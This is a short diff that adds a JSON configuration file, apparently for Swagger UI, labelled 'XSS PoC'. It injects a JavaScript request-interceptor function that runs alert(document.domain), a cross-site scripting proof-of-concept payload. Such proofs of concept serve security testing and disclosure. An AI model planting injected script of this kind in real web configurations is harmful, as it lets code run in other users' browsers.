@@ -1,0 +1,4 @@
+{
+  "urls": [{ "url": "/api/swagger.json", "name": "XSS PoC" }],
+  "RequestInterceptorFunction": "function() { alert(document.domain) }"
+}
